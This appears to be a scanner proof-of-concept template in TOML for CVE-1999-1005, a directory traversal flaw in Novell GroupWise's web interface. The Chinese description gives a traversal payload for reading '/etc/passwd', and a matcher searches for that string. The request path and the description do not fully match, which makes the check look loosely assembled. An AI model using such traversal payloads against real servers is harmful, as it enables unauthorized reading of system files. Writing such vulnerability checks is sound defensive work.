[info]
author = "ave"
description = "Novell GroupWise web server GWWEB.EXE 存在目录遍历漏洞，通过在 HELP 参数中注入 '../' 序列，攻击者可读取服务器上任意位置的 .htm 文件。利用 HELP?test../../../etc/passwd 获取服务器文件系统信息。"
id = "POC-AVE-1999-0850"
name = "Novell GroupWise GWWEB.EXE 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-1999-0850"]
vuln_id = [
    "CVE-1999-1005",
    "AVE-1999-0850",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/wpgui/help.exe"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["../../../etc/passwd"]
